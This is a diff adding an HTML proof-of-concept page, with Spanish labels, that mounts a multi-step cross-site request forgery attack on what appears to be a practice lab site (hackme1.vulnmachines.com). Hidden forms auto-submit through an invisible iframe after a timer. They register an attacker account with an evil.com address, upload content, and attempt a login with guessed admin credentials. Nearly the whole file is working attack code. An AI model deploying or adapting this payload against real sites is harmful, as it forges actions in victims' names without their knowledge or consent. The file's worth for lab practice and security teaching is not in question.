@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Advanced Multi-Action</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .attack { border: 1px solid #ccc; margin: 10px 0; padding: 10px; }
+        .success { color: green; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+    <h1>CSRF Attack - Advanced Multi-Action</h1>
+    <p>Este payload demuestra múltiples ataques CSRF en secuencia.</p>
+    
+    <div class="attack">
+        <h3>Ataque 1: Registro de usuario malicioso</h3>
+        <form id="signupForm" action="http://hackme1.vulnmachines.com/csrf/signin.php" method="POST" target="hiddenFrame">
+            <input type="hidden" name="fname" value="CSRF">
+            <input type="hidden" name="lname" value="Attacker">
+            <input type="hidden" name="email" value="csrf.attacker@evil.com">
+            <input type="hidden" name="password" value="csrf123456">
+            <input type="hidden" name="gender" value="male">
+            <input type="hidden" name="cno" value="1234567890">
+            <input type="hidden" name="age" value="25">
+            <input type="hidden" name="submit" value="Submit">
+        </form>
+        <p id="signupStatus">Esperando...</p>
+    </div>
+    
+    <div class="attack">
+        <h3>Ataque 2: Upload de contenido malicioso</h3>
+        <form id="uploadForm" action="http://hackme1.vulnmachines.com/csrf/upload.php" method="POST" target="hiddenFrame">
+            <input type="hidden" name="title" value="CSRF Malicious Upload">
+            <input type="hidden" name="comp" value="Contenido malicioso subido mediante CSRF. Esto demuestra que un atacante puede hacer que la víctima suba contenido sin su consentimiento.">
+            <input type="hidden" name="submit" value="Submit">
+        </form>
+        <p id="uploadStatus">Esperando...</p>
+    </div>
+    
+    <div class="attack">
+        <h3>Ataque 3: Intento de login con credenciales robadas</h3>
+        <form id="loginForm" action="http://hackme1.vulnmachines.com/csrf/login_exec.php" method="POST" target="hiddenFrame">
+            <input type="hidden" name="email" value="admin@hackme1.vulnmachines.com">
+            <input type="hidden" name="password" value="admin123">
+        </form>
+        <p id="loginStatus">Esperando...</p>
+    </div>
+    
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+    
+    <script>
+        let attackCount = 0;
+        const totalAttacks = 3;
+        
+        function updateStatus(formId, statusId, message, isSuccess = true) {
+            const statusElement = document.getElementById(statusId);
+            statusElement.textContent = message;
+            statusElement.className = isSuccess ? 'success' : 'error';
+        }
+        
+        function executeAttack(formId, statusId, attackName) {
+            const form = document.getElementById(formId);
+            updateStatus(formId, statusId, `Ejecutando ${attackName}...`);
+            
+            form.addEventListener('load', function() {
+                attackCount++;
+                updateStatus(formId, statusId, `${attackName} completado (${attackCount}/${totalAttacks})`);
+                
+                if (attackCount < totalAttacks) {
+                    setTimeout(() => {
+                        executeNextAttack();
+                    }, 1000);
+                } else {
+                    updateStatus(formId, statusId, `Todos los ataques CSRF completados!`);
+                }
+            });
+            
+            form.submit();
+        }
+        
+        function executeNextAttack() {
+            switch(attackCount) {
+                case 0:
+                    executeAttack('signupForm', 'signupStatus', 'Registro de usuario');
+                    break;
+                case 1:
+                    executeAttack('uploadForm', 'uploadStatus', 'Upload de contenido');
+                    break;
+                case 2:
+                    executeAttack('loginForm', 'loginStatus', 'Intento de login');
+                    break;
+            }
+        }
+        
+        // Iniciar ataques después de 2 segundos
+        setTimeout(() => {
+            executeNextAttack();
+        }, 2000);
+    </script>
+    
+    <p><strong>Nota:</strong> Este payload demuestra cómo un atacante puede ejecutar múltiples acciones maliciosas en nombre de la víctima sin su conocimiento.</p>
+</body>
+</html>
